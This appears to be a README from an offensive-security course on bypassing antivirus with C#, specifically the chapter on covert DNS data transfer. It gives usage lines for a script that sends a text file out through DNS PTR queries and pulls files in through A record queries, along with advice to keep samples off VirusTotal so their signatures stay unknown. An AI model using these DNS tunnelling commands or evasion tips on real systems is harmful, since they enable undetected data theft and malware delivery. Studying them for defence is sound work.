# Course : Bypassing Anti Viruses by C#.NET Programming

Part 2 (Infil/Exfiltration/Transferring Techniques by C#)  , Chapter 4 : DATA Transferring Technique by DNS Traffic (A Records)

eBook : Bypassing Anti Viruses by C#.NET Programming

eBook chapter 4 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH4

eBook chapter 5 , PDF Download : https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/tree/master/CH5

Related Video : 

Video 1 for chapter 4: https://www.youtube.com/watch?v=TjOTdxnyvV0

Video 2 for chapter 5: https://www.youtube.com/watch?v=zKUg_0LC9fk



Warning :Don't Use "www.virustotal.com" or something like that , Never Ever ;D

Recommended:

STEP 1 : Use each AV one by one in your LAB .

STEP 2 : after "AV Signature Database Updated" your Internet Connection should be "Disconnect" .

STEP 3 : Now you can Copy and Paste your C# code to your Virtual Machine for test .

# NativePayload_DNS2.sh help :

	Example A-Step1: (Server Side ) ./NativePayload_DNS2.sh -r
  
	Example A-Step2: (Client Side ) ./NativePayload_DNS2.sh -u text.txt DNSMASQ_IPv4 delay(sec)
  
	example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -r
  
	example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -u text.txt 192.168.56.110  0
  
	Description: with A-Step1 you will make DNS Server , with A-Step2 you can Send text file via PTR Queries to DNS server
  
	Example B-Step1: (Server Side ) ./NativePayload_DNS2.sh -d makedns test.txt mydomain.com
  
	Example B-Step2: (Client Side ) ./NativePayload_DNS2.sh -d getdata mydomain.com DNSMASQ_IPv4
  
	example IPv4:192.168.56.110 : ./NativePayload_DNS2.sh -d makedns text.txt google.com
  
	example IPv4:192.168.56.111 : ./NativePayload_DNS2.sh -d getdata google.com 192.168.56.110
  
	Description: with B-Step1 you will have DNS Server , with B-Step2 you can Dump test.txt file from server via A record Query
  
